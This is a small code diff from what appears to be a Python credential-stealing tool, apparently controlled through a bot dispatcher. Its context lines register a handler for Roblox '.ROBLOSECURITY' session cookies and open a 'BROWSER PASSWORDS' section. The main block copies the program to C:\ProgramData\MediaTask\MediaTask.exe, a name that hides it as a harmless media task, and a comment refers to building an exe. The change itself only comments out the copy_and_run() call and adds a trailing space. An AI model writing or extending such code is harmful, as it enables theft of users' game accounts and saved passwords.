@@ -51,7 +51,7 @@ register_cmd_comand(dp)
 
 from lib.Credintial.roblosecurity import register_roblosecurity_handler
 
-register_roblosecurity_handler(dp)
+register_roblosecurity_handler(dp) 
 
 #########################  BROWSER PASSWORDS  #############################
 
@@ -322,7 +322,7 @@ if __name__ == "__main__":
 
     ########### UNCOMMIT WHEN YOU WILL BUILD EXE ###########
 
-    copy_and_run()
+    # copy_and_run()
 
     script_path = 'C:\\ProgramData\\MediaTask\\MediaTask.exe'
 
